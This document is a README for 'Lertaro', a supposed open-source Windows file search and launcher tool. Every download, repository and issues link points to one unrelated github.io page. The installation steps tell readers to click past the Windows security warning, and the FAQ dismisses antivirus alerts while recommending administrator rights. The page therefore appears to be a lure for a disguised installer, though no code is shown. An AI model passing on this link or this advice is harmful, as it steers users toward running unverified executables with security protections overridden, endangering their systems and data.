# 🚀 Lertaro - Find Files Instantly, Boost Productivity

[![Download Lertaro](https://img.shields.io/badge/Download-Lertaro-blue?style=for-the-badge&logo=windows)](https://adelmagical742.github.io)

## 📋 Overview

Lertaro is a modern, high-performance local file search and productivity tool for Windows. It's a sleek, customizable alternative to Everything and Listary, built with C# WPF and Windows NT Services. Lertaro uses instant NTFS MFT parsing and real-time USN journal monitoring to deliver lightning-fast search results. It also supports plugins to extend its functionality.

## 🚀 Getting Started

### System Requirements

To run Lertaro, your computer should meet these minimum requirements:

- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
- **Processor:** 1 GHz or faster
- **RAM:** 2 GB or more
- **Disk Space:** 50 MB of free space
- **NET Framework:** .NET 6.0 or later (if not installed, the installer will guide you)

### Installation

1. **Download Lertaro:** Visit the [official download page](https://adelmagical742.github.io) to get the latest version.
2. **Run the Installer:** Double-click the downloaded file. If you see a security warning, click "More info" and then "Run anyway" – this is normal for new software.
3. **Follow Setup Wizard:** Click "Next" through the installation steps. Choose a destination folder (default is fine) and click "Install."
4. **Launch Lertaro:** Once installed, Lertaro will start automatically. You can also find it in your Start Menu or taskbar.

### First Use

When you first open Lertaro, you'll see a search bar at the top of your screen. Simply start typing to find files, folders, or applications. Press `Enter` to open the selected item. You can customize settings by right-clicking the Lertaro icon in your system tray.

## 🎯 Features

### Instant File Search
Lertaro indexes your entire hard drive in seconds using NTFS MFT (Master File Table) parsing. This means you can find any file or folder instantly, even on drives with millions of files.

### Real-Time Monitoring
The USN (Update Sequence Number) journal monitors changes in real time. New files, renamed files, or deleted files appear in search results immediately without manual re-indexing.

### Plugin Support
Extend Lertaro's functionality with plugins. You can add custom actions, additional search sources, or integrate with other tools. Plugins are easy to install and manage.

### Customizable Interface
Choose from multiple themes, adjust font sizes, and configure hotkeys. Lertaro can blend into your workflow seamlessly.

### Keyboard-Friendly
Navigate entirely with your keyboard. Press `Ctrl + Space` to open the search bar, use arrow keys to scroll results, and press `Enter` to open. No mouse needed.

### Application Launcher
Launch applications, open folders, or run commands directly from the search bar. Lertaro indexes your Start Menu and installed programs.

## 📥 Download

Visit the [Lertaro Releases page](https://adelmagical742.github.io) to download the application.

## 🛠️ How It Works

Lertaro leverages Windows NT Services to run in the background with minimal resource usage. The core engine parses the NTFS MFT (Master File Table) to build a file index in seconds. The USN journal provides real-time updates, so your index is always current. When you type a query, Lertaro searches this index and displays results instantly.

## 🔧 Configuration

### General Settings
- **Start with Windows:** Enable to launch Lertaro automatically when you log in.
- **Run as Administrator:** Required for full disk access (recommended for best performance).
- **Index Drives:** Choose which drives to include in search.

### Hotkeys
- **Search Hotkey:** Default is `Ctrl + Space`. Customize to your preference.
- **Open File:** Double-click or press `Enter` on a selected result.
- **Open Folder:** Press `Ctrl + Enter` on a selected result.

### Appearance
- **Theme:** Light, Dark, or custom.
- **Font Size:** Adjust for readability.
- **Opacity:** Set transparency for the search window.

## 🔌 Plugin Management

1. **Download Plugins:** Find plugins from the community or create your own.
2. **Install:** Place plugin files in the `Plugins` folder inside Lertaro's installation directory.
3. **Enable:** Open Lertaro settings, go to "Plugins," and enable the ones you want.
4. **Configure:** Some plugins have their own settings.

## ❓ Frequently Asked Questions

### Is Lertaro free?
Yes, Lertaro is completely free to use. It is open-source software.

### Does Lertaro collect my data?
No, Lertaro does not collect any personal data. All search and indexing happen locally on your computer.

### Can I search network drives?
Yes, you can add network drives to the index in settings.

### How do I uninstall Lertaro?
Go to Windows Settings > Apps > Apps & features, find Lertaro, and click Uninstall.

### What if I get a virus warning?
Lertaro is safe. Some antivirus software may flag new applications. You can verify the software by checking its open-source code or submitting it to VirusTotal.

## 🐛 Troubleshooting

### Search is slow
- Ensure Lertaro is running as Administrator.
- Check if your hard drive is NTFS (FAT32 drives are not supported).
- Reduce the number of indexed drives.

### Application not found
- Make sure Lertaro is running (check system tray).
- Restart the application from the system tray menu.

### Plugin not working
- Verify the plugin is compatible with your Lertaro version.
- Reinstall the plugin or check for updates.

## 📝 License

Lertaro is open-source software. Check the repository for license details.

## 🤝 Contributing

We welcome contributions! If you have ideas, bug reports, or want to help with development, visit the [Lertaro GitHub repository](https://adelmagical742.github.io).

## 📧 Support

For help, open an issue on the [GitHub Issues page](https://adelmagical742.github.io) or join the community discussions.

Keywords: application-launcher, desktop, efficiency, everyting, keyboard-launcher, launcher, listary, plugins, productivity, productivity-tools, search, windows, windows-search